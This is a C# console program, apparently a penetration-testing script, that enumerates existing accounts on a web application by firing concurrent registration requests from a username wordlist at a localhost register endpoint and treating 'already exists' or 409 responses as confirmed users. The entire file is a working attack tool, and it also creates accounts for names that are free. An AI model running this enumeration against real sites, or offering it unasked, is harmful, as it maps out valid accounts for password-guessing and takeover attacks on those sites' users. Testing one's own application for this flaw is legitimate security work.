using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace UsernameEnumeration
{
    class Program
    {
        // Configuration
        private const string TARGET_URL = "http://localhost:4200/bff/account/register";
        private const string USERNAMES_FILE = "usernames.txt";
        private const string OUTPUT_FILE = "confirmed_users.txt";
        private const int MAX_CONCURRENT_REQUESTS = 10;

        private static readonly HttpClient httpClient = new HttpClient();

        static async Task Main(string[] args)
        {
            Console.WriteLine("[*] Username Enumeration Script");
            Console.WriteLine($"[*] Target: {TARGET_URL}");
            Console.WriteLine($"[*] Max Concurrent Requests: {MAX_CONCURRENT_REQUESTS}");
            Console.WriteLine("[*] Starting enumeration...\n");

            // Read usernames from file
            if (!File.Exists(USERNAMES_FILE))
            {
                Console.WriteLine($"[!] Error: {USERNAMES_FILE} not found");
                Console.WriteLine("[!] Creating sample usernames.txt file...");
                CreateSampleUsernamesFile();
                return;
            }

            var usernames = File.ReadAllLines(USERNAMES_FILE)
                .Where(line => !string.IsNullOrWhiteSpace(line))
                .Select(line => line.Trim())
                .ToList();

            Console.WriteLine($"[*] Loaded {usernames.Count} usernames to test\n");

            var confirmedUsers = new List<string>();
            var semaphore = new System.Threading.SemaphoreSlim(MAX_CONCURRENT_REQUESTS);
            var tasks = new List<Task>();
            var processedCount = 0;
            var lockObject = new object();

            foreach (var username in usernames)
            {
                await semaphore.WaitAsync();
                
                var task = Task.Run(async () =>
                {
                    try
                    {
                        var result = await CheckUsername(username);
                        
                        lock (lockObject)
                        {
                            processedCount++;
                            
                            if (result.Exists == true)
                            {
                                Console.ForegroundColor = ConsoleColor.Green;
                                Console.WriteLine($"[+] FOUND: {result.Username} - {result.Message}");
                                Console.ResetColor();
                                confirmedUsers.Add(result.Username);
                            }
                            else if (result.Exists == null)
                            {
                                Console.ForegroundColor = ConsoleColor.Yellow;
                                Console.WriteLine($"[!] ERROR: {result.Username} - {result.Message}");
                                Console.ResetColor();
                            }
                            else
                            {
                                Console.WriteLine($"[-] Not found: {result.Username}");
                            }

                            if (processedCount % 10 == 0)
                            {
                                Console.WriteLine($"[*] Progress: {processedCount}/{usernames.Count}");
                            }
                        }
                    }
                    finally
                    {
                        semaphore.Release();
                    }
                });

                tasks.Add(task);
            }

            await Task.WhenAll(tasks);

            // Display and save results
            Console.WriteLine($"\n[*] Enumeration complete!");
            Console.WriteLine($"[*] Found {confirmedUsers.Count} confirmed users");

            if (confirmedUsers.Any())
            {
                File.WriteAllLines(OUTPUT_FILE, confirmedUsers);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[*] Results saved to {OUTPUT_FILE}");
                Console.ResetColor();
                
                Console.WriteLine("\n[+] Confirmed users:");
                foreach (var user in confirmedUsers)
                {
                    Console.WriteLine($"    - {user}");
                }
            }

            Console.WriteLine("\nPress any key to exit...");
            Console.ReadKey();
        }

        private static async Task<UsernameCheckResult> CheckUsername(string username)
        {
            try
            {
                var payload = new
                {
                    userName = username,
                    password = "TestPassword123!"
                };

                var jsonContent = JsonSerializer.Serialize(payload);
                var content = new StringContent(jsonContent, Encoding.UTF8, "application/json");

                // Set headers
                var request = new HttpRequestMessage(HttpMethod.Post, TARGET_URL)
                {
                    Content = content
                };
                
                request.Headers.Add("Origin", "http://localhost:4200");
                request.Headers.Add("Referer", "http://localhost:4200/register");

                var response = await httpClient.SendAsync(request);
                var responseBody = await response.Content.ReadAsStringAsync();

                // Analyze response
                if (response.IsSuccessStatusCode)
                {
                    return new UsernameCheckResult
                    {
                        Username = username,
                        Exists = false,
                        Message = "User created (didn't exist)"
                    };
                }
                else if ((int)response.StatusCode == 400)
                {
                    // Check response body for specific error messages
                    var errorMsg = responseBody.ToLower();
                    
                    if (errorMsg.Contains("already exists") || 
                        errorMsg.Contains("taken") || 
                        errorMsg.Contains("unavailable") || 
                        errorMsg.Contains("in use") ||
                        errorMsg.Contains("already registered"))
                    {
                        return new UsernameCheckResult
                        {
                            Username = username,
                            Exists = true,
                            Message = responseBody.Length > 100 ? responseBody.Substring(0, 100) + "..." : responseBody
                        };
                    }
                    
                    return new UsernameCheckResult
                    {
                        Username = username,
                        Exists = false,
                        Message = $"Status {(int)response.StatusCode}"
                    };
                }
                else if ((int)response.StatusCode == 409)
                {
                    return new UsernameCheckResult
                    {
                        Username = username,
                        Exists = true,
                        Message = "Conflict - User exists"
                    };
                }
                else
                {
                    return new UsernameCheckResult
                    {
                        Username = username,
                        Exists = false,
                        Message = $"Status {(int)response.StatusCode}"
                    };
                }
            }
            catch (Exception ex)
            {
                return new UsernameCheckResult
                {
                    Username = username,
                    Exists = null,
                    Message = $"Error: {ex.Message}"
                };
            }
        }

        private static void CreateSampleUsernamesFile()
        {
            var sampleUsernames = new[]
            {
                "admin",
                "administrator",
                "user",
                "test",
                "root",
                "guest",
                "john",
                "jane",
                "developer",
                "support",
                "info",
                "contact",
                "sales",
                "demo",
                "testuser",
                "manager"
            };

            File.WriteAllLines(USERNAMES_FILE, sampleUsernames);
            Console.WriteLine($"[*] Created {USERNAMES_FILE} with sample usernames");
        }
    }

    class UsernameCheckResult
    {
        public string Username { get; set; }
        public bool? Exists { get; set; }  // null = error, true = exists, false = doesn't exist
        public string Message { get; set; }
    }
}